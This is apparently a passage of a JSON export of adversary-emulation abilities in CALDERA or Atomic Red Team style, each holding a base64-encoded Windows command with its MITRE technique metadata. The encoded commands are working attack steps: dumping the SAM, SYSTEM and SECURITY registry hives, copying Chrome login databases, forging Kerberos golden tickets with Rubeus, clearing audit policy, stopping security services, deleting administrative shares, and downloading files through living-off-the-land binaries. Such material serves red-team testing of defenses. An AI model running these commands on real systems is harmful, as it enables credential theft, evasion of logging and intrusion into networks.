"JHN5bnRheExpc3QgPSAiSW52b2tlLUFDTFNjYW5uZXIiLCAiSW52b2tlLUtlcmJlcm9hc3QiLCAiRmluZC1Eb21haW5TaGFyZSIgOyA7IGZvcmVhY2ggKCRzeW50YXggaW4gJHN5bnRheExpc3QpIHs7IFBhdGhUb0F0b21pY3NGb2xkZXJcVDEwNDlcYmluXFNoYXJwVmlldy5leGUgJHN5bnRheCAtfQ==", "ability_id": "e29316e4fd973db867b0115db7d5f0c8", "technique_name": "System Network Connections Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1049", "platform": "windows", "name": "System Discovery using SharpView", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Get a listing of network connections, domains, domain users, and etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.\n", "variations": []}, {"test": "JGtleT0gIkhLQ1U6XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEludGVybmV0IFNldHRpbmdzXFpvbmVNYXBcRG9tYWluc1xiYWQtZG9tYWluLmNvbVwiOyAkbmFtZSA9ImJhZC1zdWJkb21haW4iOyBuZXctaXRlbSAka2V5IC1OYW1lICRuYW1lIC1Gb3JjZTsgbmV3LWl0ZW1wcm9wZXJ0eSAka2V5JG5hbWUgLU5hbWUgaHR0cHMgLVZhbHVlIDIgLVR5cGUgRFdPUkQ7OyBuZXctaXRlbXByb3BlcnR5ICRrZXkkbmFtZSAtTmFtZSBodHRwICAtVmFsdWUgMiAtVHlwZSBEV09SRDs7IG5ldy1pdGVtcHJvcGVydHkgJGtleSRuYW1lIC1OYW1lICogICAgIC1WYWx1ZSAyIC1UeXBlIERXT1JEOw==", "ability_id": "dfc87030ef2a2a6e2af5d1486203f51f", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Add domain to Trusted sites Zone", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGtleSA9ICJIS0NVOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5nc1xab25lTWFwXERvbWFpbnNcYmFkLWRvbWFpbi5jb21cIjsgUmVtb3ZlLWl0ZW0gICRrZXkgLVJlY3Vyc2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n", "variations": []}, {"test": "U2V0LUxvY2F0aW9uIC1wYXRoICIkZW52OlRFTVBcU3lzaW50ZXJuYWxzIjs7IC4vYWNjZXNzY2hrLmV4ZSAtYWNjZXB0ZXVsYSAuOw==", "ability_id": "d8b1f8653b24fadb7d673af718924a9e", "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "additional_info": {}, "privilege": "", "technique_id": "T1555.003", "platform": "windows", "name": "Run Chrome-password Collector", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXFN5c2ludGVybmFscyAtRm9yY2UgLVJlY3Vyc2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of $env:TEMP\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n", "variations": []}, {"test": "ZmluZ2VyIGJhc2U2NF9maWxlZGF0YUBsb2NhbGhvc3Q=", "ability_id": "1095434782a00c8a4772a11e625bcf5d", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "File download with finger.exe on Windows", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.\nBecause this is being tested on the localhost, you should not be expecting a successful connection\nhttps://www.exploit-db.com/exploits/48815\nhttps://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/\n", "variations": []}, {"test": "U3RvcC1TZXJ2aWNlIC1OYW1lIE1jQWZlZURMUEFnZW50U2VydmljZTsgUmVtb3ZlLVNlcnZpY2UgLU5hbWUgTWNBZmVlRExQQWdlbnRTZXJ2aWNl", "ability_id": "daec5455d580c39b8d2c00eaa9d645b7", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Stop and Remove Arbitrary Security Windows Service", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n", "variations": []}, {"test": "Q29weS1JdGVtICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XExvZ2luIERhdGEiIC1EZXN0aW5hdGlvbiAkZW52OnRlbXA7IENvcHktSXRlbSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxMb2dpbiBEYXRhIEZvciBBY2NvdW50IiAtRGVzdGluYXRpb24gJGVudjp0ZW1w", "ability_id": "3267861a1da6d870da272e15b9ab088b", "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "additional_info": {}, "privilege": "", "technique_id": "T1555.003", "platform": "windows", "name": "Simulating access to Chrome Login Data", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggIiRlbnY6dGVtcFxMb2dpbiBEYXRhIiAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZTsgUmVtb3ZlLUl0ZW0gLVBhdGggIiRlbnY6dGVtcFxMb2dpbiBEYXRhIEZvciBBY2NvdW50IiAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Simulates an adversary accessing encrypted credentials from Google Chrome Login database. \n", "variations": []}, {"test": "Y2ZiODVmX1BzaXBob24uYmF0", "ability_id": "f6946b4e5a258b48b986d3d6551f511f", "technique_name": "Proxy: Multi-hop Proxy", "additional_info": {}, "privilege": "", "technique_id": "T1090.003", "platform": "windows", "name": "Psiphon", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["cfb85f_Psiphon.bat"], "cleanup": ["JFByb3h5ID0gR2V0LUNvbnRlbnQgJGVudjpUZW1wXHByb3h5LWJhY2t1cC50eHQgLUVycm9yQWN0aW9uIElnbm9yZTsgaWYoJG51bGwgLW5lICRQcm94eSkgOyB7U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cSW50ZXJuZXQgU2V0dGluZ3MnIC1OYW1lICJQcm94eVNlcnZlciIgLVZhbHVlICRQcm94eX0=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJjZmI4NWZfUHNpcGhvbi5iYXQi"], "executor": "psh", "access": {}, "description": "Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you\nwith uncensored access to Internet.\nThis process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.\nMore information can be found about Psiphon using the following urls\nhttp://s3.amazonaws.com/0ubz-2q11-gi9y/en.html\nhttps://psiphon.ca/faq.html\n", "variations": []}, {"test": "cmVnIHNhdmUgSEtMTVxzYW0gJXRlbXAlXHNhbSAmJiByZWcgc2F2ZSBIS0xNXHN5c3RlbSAldGVtcCVcc3lzdGVtICYmIHJlZyBzYXZlIEhLTE1cc2VjdXJpdHkgJXRlbXAlXHNlY3VyaXR5", "ability_id": "7fa4ea18694f2552547b65e23952cabb", "technique_name": "OS Credential Dumping: Security Account Manager", "additional_info": {}, "privilege": "", "technique_id": "T1003.002", "platform": "windows", "name": "Registry dump of SAM, creds, and secrets", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICV0ZW1wJVxzYW0gPm51bCAyPiBudWwgJiYgZGVsICV0ZW1wJVxzeXN0ZW0gPm51bCAyPiBudWwgJiYgZGVsICV0ZW1wJVxzZWN1cml0eSA+bnVsIDI+IG51bA=="], "executor": "cmd", "access": {}, "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n", "variations": []}, {"test": "SW52b2tlLVdlYlJlcXVlc3Qgd3d3Lmdvb2dsZS5jb20gLVVzZXJBZ2VudCAiSHR0cEJyb3dzZXIvMS4wIiB8IG91dC1udWxsOyBJbnZva2UtV2ViUmVxdWVzdCB3d3cuZ29vZ2xlLmNvbSAtVXNlckFnZW50ICJXZ2V0LzEuOStjdnMtc3RhYmxlIChSZWQgSGF0IG1vZGlmaWVkKSIgfCBvdXQtbnVsbDsgSW52b2tlLVdlYlJlcXVlc3Qgd3d3Lmdvb2dsZS5jb20gLVVzZXJBZ2VudCAiT3BlcmEvOC44MSAoV2luZG93cyBOVCA2LjA7IFU7IGVuKSIgfCBvdXQtbnVsbDsgSW52b2tlLVdlYlJlcXVlc3Qgd3d3Lmdvb2dsZS5jb20gLVVzZXJBZ2VudCAiKjx8PioiIHwgb3V0LW51bGw=", "ability_id": "ae17973a4ce815dfed6935308599f05c", "technique_name": "Application Layer Protocol: Web Protocols", "additional_info": {}, "privilege": "", "technique_id": "T1071.001", "platform": "windows", "name": "Malicious User Agents - Powershell", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "variations": []}, {"test": "cHlweWthdHogbGl2ZSByZWdpc3RyeQ==", "ability_id": "0a154631923cfdbf2bc717716a9b75d8", "technique_name": "OS Credential Dumping: Security Account Manager", "additional_info": {}, "privilege": "", "technique_id": "T1003.002", "platform": "windows", "name": "Registry parse with pypykatz", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Parses registry hives to obtain stored credentials\n", "variations": []}, {"test": "UmVtb3ZlLUl0ZW0gJGVudjpURU1QXGdvbGRlbi5iYXQgLUVycm9yQWN0aW9uIElnbm9yZTsgUmVtb3ZlLUl0ZW0gJGVudjpURU1QXGdvbGRlbi50eHQgLUVycm9yQWN0aW9uIElnbm9yZTsgOyBjbWQuZXhlIC9jICIkRW52OnRlbXBccnViZXVzLmV4ZSIgZ29sZGVuIC9hZXMyNTY6YjcyNjgzNjEzODYwOTAzMTRhY2NlOGQ5MzY3ZTU1ZjU1ODY1ZTdlZjhlNjcwZmJlNDI2MmQ2Yzk0MDk4YTllOSAvbGRhcCAvdXNlcjokRU5WOnVzZXJuYW1lIC9kYzokKCRFTlY6bG9nb25zZXJ2ZXIuVHJpbVN0YXJ0KCdcJykgKyAiLiIgKyAiJEVOVjp1c2VyZG5zZG9tYWluIikgL3ByaW50Y21kIC9vdXRmaWxlOmdvbGRlbjsgJGZpbGVuYW1lID0gKEdldC1DaGlsZEl0ZW0gfCA/IHskXy5OYW1lLnN0YXJ0c3dpdGgoImdvbGRlbl8iKX0gfCBTb3J0LU9iamVjdCAtRGVzY2VuZGluZyAtUHJvcGVydHkgTGFzdFdyaXRlVGltZSB8IHNlbGVjdCAtRmlyc3QgMSkuTmFtZTsgOyAjIGNyZWF0ZSBiYXRjaCBmaWxlIHdpdGggY29tbWFuZHMgdG8gcnVuIGluIGEgc2VwYXJhdGUgInJ1bmFzIC9uZXRvbmx5IiBzZXNzaW9uOyAjIHNvIHdlIGRvbid0IHB1cmdlIEtlcmJlcm9zIHRpY2tldCBmcm9tIHRoZSBjdXJyZW50IFdpbmRvd3Mgc2Vzc2lvbjsgIyBpdHMgb3V0cHV0IGdvZXMgdG8gZ29sZGVuLnR4dCB0ZW1wIGZpbGUsIGJlY2F1c2Ugd2UgY2Fubm90IGNhcHR1cmUgInJ1bmFzIC9uZXRvbmx5IiBvdXRwdXQgb3RoZXJ3aXNlOyBAIjsgPiVURU1QJVxnb2xkZW4udHh0IDI+JjEgKDsgICBlY2hvIFB1cmdlIGV4aXN0aW5nIHRpY2tldHMgYW5kIGNyZWF0ZSBnb2xkZW4gdGlja2V0OjsgICBrbGlzdCBwdXJnZTsgICBjZCAldGVtcCU7ICAgIiRFbnY6dGVtcFxydWJldXMuZXhlIiBwdHQgL3RpY2tldDpraXJiaWZpbGU7IDsgICBlY2hvLjsgICBlY2hvIFJlcXVlc3RpbmcgU1lTVk9MOjsgICBkaXIgXFwkKCRFTlY6bG9nb25zZXJ2ZXIuVHJpbVN0YXJ0KCdcJykgKyAiLiIgKyAiJEVOVjp1c2VyZG5zZG9tYWluIilcU1lTVk9MOyAgIDsgICBlY2hvLjsgICBlY2hvIFRpY2tldHMgYWZ0ZXIgcmVxdWVzdGluZyBTWVNWT0w6OyAgIGtsaXN0OyA7ICAgZWNoby47ICAgZWNobyBFbmQgb2YgR29sZGVuIFRpY2tldCBhdHRhY2s7ICk7ICJAIC1SZXBsYWNlICJraXJiaWZpbGUiLCAkZmlsZW5hbWUgfCBPdXQtRmlsZSAtRW5jb2RpbmcgT0VNICRlbnY6VEVNUFxnb2xkZW4uYmF0OyA7ICMgcnVuIGJhdGNoIGZpbGUgaW4gYSBuZXcgZW1wdHkgc2Vzc2lvbiAocGFzc3dvcmQgYW5kIHVzZXJuYW1lIGRvIG5vdCBtYXR0ZXIpOyBlY2hvICJmb28iIHwgcnVuYXMgL25ldG9ubHkgL3VzZXI6ZmFrZSAiJGVudjpURU1QXGdvbGRlbi5iYXQiIHwgT3V0LU51bGw7IDsgIyB3YWl0IHVudGlsIHRoZSBvdXRwdXQgZmlsZSBoYXMgbG9nZ2VkIHRoZSBlbnRpcmUgYXR0YWNrOyBkbyB7OyAgIFN0YXJ0LVNsZWVwIDEgIyB3YWl0IGEgYml0IHNvIHRoZSBvdXRwdXQgZmlsZSBoYXMgdGltZSB0byBiZSBjcmVhdGVkOyAgIEdldC1Db250ZW50IC1QYXRoICIkZW52OlRFTVBcZ29sZGVuLnR4dCIgLVdhaXQgfCBGb3JFYWNoLU9iamVjdCB7OyAgICAgaWYgKCRfIC1tYXRjaCAnRW5kIG9mIEdvbGRlbiBUaWNrZXQgYXR0YWNrJykgeyBicmVhayB9IDsgICB9OyB9IHdoaWxlICgkZmFsc2UpICMgZHVtbXkgbG9vcCBzbyB0aGF0ICdicmVhaycgY2FuIGJlIHVzZWQ7IDsgIyBzaG93IG91dHB1dCBmcm9tIG5ldyBlbXB0eSBzZXNzaW9uOyBHZXQtQ29udGVudCAkZW52OlRFTVBcZ29sZGVuLnR4dDsgOyAjIGNsZWFudXAgdGVtcCBmaWxlczsgUmVtb3ZlLUl0ZW0gJGVudjpURU1QXGdvbGRlbi5iYXQgLUVycm9yQWN0aW9uIElnbm9yZTsgUmVtb3ZlLUl0ZW0gJGVudjpURU1QXGdvbGRlbi50eHQgLUVycm9yQWN0aW9uIElnbm9yZQ==", "ability_id": "b889948b60591c9fae80f96e54357985", "technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket", "additional_info": {}, "privilege": "", "technique_id": "T1558.001", "platform": "windows", "name": "Crafting Active Directory golden tickets with Rubeus", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n", "variations": []}, {"test": "YXVkaXRwb2wgL2NsZWFyIC95ICYmIGF1ZGl0cG9sIC9yZW1vdmUgL2FsbHVzZXJz", "ability_id": "6a8d25d65a7d481dc479f89c62af1e6a", "technique_name": "Impair Defenses: Disable Windows Event Logging", "additional_info": {}, "privilege": "", "technique_id": "T1562.002", "platform": "windows", "name": "Clear Windows Audit Policy Config", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["YXVkaXRwb2wgL3NldCAvY2F0ZWdvcnk6IkFjY291bnQgTG9nb24iIC9zdWNjZXNzOmVuYWJsZSAvZmFpbHVyZTplbmFibGUgJiYgYXVkaXRwb2wgL3NldCAvY2F0ZWdvcnk6IkRldGFpbGVkIFRyYWNraW5nIiAvc3VjY2VzczplbmFibGUgJiYgYXVkaXRwb2wgL3NldCAvY2F0ZWdvcnk6IkxvZ29uL0xvZ29mZiIgL3N1Y2Nlc3M6ZW5hYmxlIC9mYWlsdXJlOmVuYWJsZQ=="], "executor": "cmd", "access": {}, "description": "Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.", "variations": []}, {"test": "Zm9yICVpIGluIChDJCBJUEMkIEFETUlOJCkgZG8gbmV0IHNoYXJlICVpIC9kZWxldGU=", "ability_id": "1b43591006b8e25b8df16ee52f0832bf", "technique_name": "Indicator Removal on Host: Network Share Connection Removal", "additional_info": {}, "privilege": "", "technique_id": "T1070.005", "platform": "windows", "name": "Remove Administrative Shares", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0IHNoYXJlIEFETUlOJCAvVU5MSU1JVEVEID5udWwgMj4mMSAmJiBuZXQgc2hhcmUgQyQ9QzpcID5udWwgMj4mMSAmJiBuZXQgc2hhcmUgSVBDJCA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. As Microsoft puts it, \u201cMissing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n", "variations": []}, {"test": "bm1hcCAxMjcuMC4wLjE=", "ability_id": "014eab58c76b4ae9c82debd5c36885f7", "technique_name": "Network Service Scanning", "additional_info": {}, "privilege": "", "technique_id": "T1046", "platform": "windows", "name": "Port Scan NMap for Windows", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Scan ports to check for listening ports for the local host 127.0.0.1", "variations": []}, {"test": "d3JpdGUtaG9zdCAiIjsgJHNoYWRvd2xpc3QgPSBnZXQtd21pb2JqZWN0IHdpbjMyX3NoYWRvd2NvcHk7ICR2b2x1bWVudW1iZXJzID0gZm9yZWFjaCgkc2hhZG93Y29weSBpbiAkc2hhZG93bGlzdCl7JHNoYWRvd2NvcHkuRGV2aWNlT2JqZWN0Wy0xXX07ICRtYXh2b2x1bWUgPSAoJHZvbHVtZW51bWJlcnMgfCBTb3J0LU9iamVjdCAtRGVzY2VuZGluZylbMF07ICRzaGFkb3dwYXRoID0gIlxcP1xHTE9CQUxST09UXERldmljZVxIYXJkZGlza1ZvbHVtZVNoYWRvd0NvcHkiICsgJG1heHZvbHVtZSArICJcV2luZG93c1xTeXN0ZW0zMlxjb25maWdcU0FNIjsgY2VydHV0aWwgLWYgLXYgLWVuY29kZWhleCAkc2hhZG93cGF0aCAkRU5WOnRlbXBcbXloaXZlIDI=", "ability_id": "e361e42f1ef5810c14e3d3792e8e77bb", "technique_name": "OS Credential Dumping: Security Account Manager", "additional_info": {}, "privilege": "", "technique_id": "T1003.002", "platform": "windows", "name": "dump volume shadow copy hives with certutil", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JHRvcmVtb3ZlID0gJEVOVjp0ZW1wICsgIlwiICsgJ215aGl2ZSc7IHJtICR0b3JlbW92ZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "Dump hives from volume shadow copies with the certutil utility\nThis can be done with a non-admin user account\n", "variations": []}, {"test": "Z2V0LWFkZGVmYXVsdGRvbWFpbnBhc3N3b3JkcG9saWN5", "ability_id": "ce92c751b95cf40c5f3eec1fba58ea5a", "technique_name": "Password Policy Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1201", "platform": "windows", "name": "Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.\nUpon successful execution a listing of the policy implemented will display.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps\n", "variations": []}, {"test": "ImM6XFByb2dyYW0gRmlsZXNcV2lyZXNoYXJrXHRzaGFyay5leGUiIC1pIEV0aGVybmV0IC1jIDU=", "ability_id": "e648f7d27bb1fd8993e12e5e265da137", "technique_name": "Network Sniffing", "additional_info": {}, "privilege": "", "technique_id": "T1040", "platform": "windows", "name": "Packet Capture Windows Command Prompt", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled.\n\nUpon successful execution, tshark will execute and capture 5 packets on interface \"Ethernet\".\n", "variations": []}, {"test": "NjdiYWE1X0dVUC5leGU=", "ability_id": "8831364340e3e4888f59e21bbfedd7de", "technique_name": "Hijack Execution Flow: DLL Side-Loading", "additional_info": {}, "privilege": "", "technique_id": "T1574.002", "platform": "windows", "name": "DLL Side-Loading using the Notepad++ GUP.exe binary", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["67baa5_GUP.exe"], "cleanup": ["dGFza2tpbGwgL0YgL0lNIGNhbGN1bGF0b3IuZXhlID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.\nUpon execution, calc.exe will be opened.\n", "variations": []}, {"test": "YXQgMTM6MjAgL2ludGVyYWN0aXZlIGNtZA==", "ability_id": "1b82e5d4e4707c4923e7a0f8143b3186", "technique_name": "Scheduled Task/Job: At (Windows)", "additional_info": {}, "privilege": "", "technique_id": "T1053.002", "platform": "windows", "name": "At.exe Scheduled task", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n\nUpon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.\n", "variations": []}, {"test": "U3RhcnQtQVRIUHJvY2Vzc1VuZGVyU3BlY2lmaWNQYXJlbnQgIC1QYXJlbnRJZCAkUElEIC1UZXN0R3VpZCAxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODkxMjM=", "ability_id": "bb01dde9d25c963844cebb616aa45eba", "technique_name": "Access Token Manipulation: Parent PID Spoofing", "additional_info": {}, "privilege": "", "technique_id": "T1134.004", "platform": "windows", "name": "Parent PID Spoofing - Spawn from Specified Process", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Spawns a notepad.exe process as a child of the current process.", "variations": []}, {"test": "c2V0ICJTWVNURU1ST09UPUM6XFdpbmRvd3NcVGVtcCIgJiYgY21kIC9jIGRlc2t0b3BpbWdkb3dubGRyLmV4ZSAvbG9ja3NjcmVlbnVybDpodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmVkY2FuYXJ5Y28vYXRvbWljLXJlZC10ZWFtL21hc3Rlci9hdG9taWNzL1QxMTk3L1QxMTk3Lm1kIC9ldmVudE5hbWU6ZGVza3RvcGltZ2Rvd25sZHI=", "ability_id": "fdee653dfaa508e308edc77910c21155", "technique_name": "BITS Jobs", "additional_info": {}, "privilege": "", "technique_id": "T1197", "platform": "windows", "name": "Bits download using desktopimgdownldr.exe (cmd)", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIEM6XFdpbmRvd3NcVGVtcFxQZXJzb25hbGl6YXRpb25cTG9ja1NjcmVlbkltYWdlXCoubWQgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (\u201c-k netsvc -p -s BITS\u201d) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n", "variations": []}, {"test": "ZXNlbnR1dGwuZXhlIC95IC92c3MgJVN5c3RlbVJvb3QlL3N5c3RlbTMyL2NvbmZpZy9TQU0gL2QgJXRlbXAlL1NBTQ==", "ability_id": "9e6d0cf857964cb178acf892c30bb35d", "technique_name": "OS Credential Dumping: Security Account Manager", "additional_info": {}, "privilege": "", "technique_id": "T1003.002", "platform": "windows", "name": "esentutl.exe SAM copy", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICV0ZW1wJVxTQU0gPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Copy the SAM hive using the esentutl.exe utility\nThis can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.\n", "variations": []}, {"test": "SW1wb3J0LU1vZHVsZSAuXHBvd2Vydmlldy5wczEgLUZvcmNlO0dldC1OZXREb21haW4gfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMQ==", "ability_id": "6131397e-7765-424e-a594-3d7fb2d93a6a", "technique_name": "Domain Trust Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1482", "platform": "windows", "name": "GetDomain", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.json", "relationships": [{"edge": "", "source": "domain.ad.forest", "custom_parser_vals": {"json_key": "Forest", "json_type": "str"}, "target": ""}, {"edge": "", "source": "domain.ad.name", "custom_parser_vals": {"json_key": "Name", "json_type": "str"}, "target": ""}]}], "payloads": ["powerview.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJwb3dlcnZpZXcucHMxIg=="], "executor": "psh", "access": {}, "description": "Determine the Windows Domain of a computer", "variations": []}, {"test": 